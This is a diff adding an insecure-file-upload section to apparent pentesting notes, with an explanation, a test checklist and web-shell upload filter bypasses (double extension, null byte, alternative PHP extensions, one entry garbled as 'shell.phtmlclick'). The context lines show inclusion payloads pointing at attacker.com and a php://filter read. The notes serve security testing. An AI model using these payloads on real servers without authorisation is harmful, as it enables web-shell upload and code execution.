@@ -62,6 +62,58 @@ http://attacker.com/malicious.php
 php://filter/convert.base64-encode/resource=index.php
 ```
 
+## Insecure file upload
+
+### What is it?
+
+Insecure File Upload vulnerability is when an application allows uncontrolled and unvalidated upload of files. An attacker can exploit this vulnerability to upload malicious files, like web shells, which can lead to code execution, data leakage, or other types of attacks.
+
+**A simple example**
+
+An application allows users to upload profile pictures without validating the file type and content, or without properly handling the file storage. An attacker can upload a PHP shell script disguised as an image file. When this file is served by the server, the malicious script can be executed.
+
+The impact of insecure file uploads includes:
+
+* Remote Code Execution (RCE)
+* Data Leakage
+* Server Compromise
+
+**Other learning resources:**
+
+* OWASP: [https://owasp.org/www-community/vulnerabilities/Unrestricted\\\\\_File\\\\\_Upload\&#x20](https://owasp.org/www-community/vulnerabilities/Unrestricted/_File/_Upload\&#x20);
+* Swisskyrepo: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
+
+### Checklist
+
+* [ ] Understand the file upload functionality
+* [ ] Are there file type restrictions?
+* [ ] Are there file size restrictions?
+* [ ] Are files renamed after upload?
+* [ ] Are files checked for content type matching the extension?
+* [ ] Test for bypassing file extension filters
+* [ ] Upload a file with a double extension (e.g., .jpg.php)
+* [ ] Upload a file with a null byte injection (e.g., .php%00.jpg)
+* [ ] Test for malicious content within a file
+* [ ] Upload a file with a simple XSS payload in its content
+* [ ] Test for inadequate file storage handling
+* [ ] Are uploaded files accessible from the internet? (Path/URL guessing)
+* [ ] Can other users access the uploaded files?
+
+### Exploitation
+
+```shellscript
+# Bypass extension filters
+# Note: req server misconfig to execute or the ability to rename once it's up
+shell.php.jpg
+
+# Null byte injection
+shell.php%00.jpg
+
+# Blocklist bypass
+shell.php5
+shell.phtmlclick
+```
+
 ## File upload
 
 ```shellscript
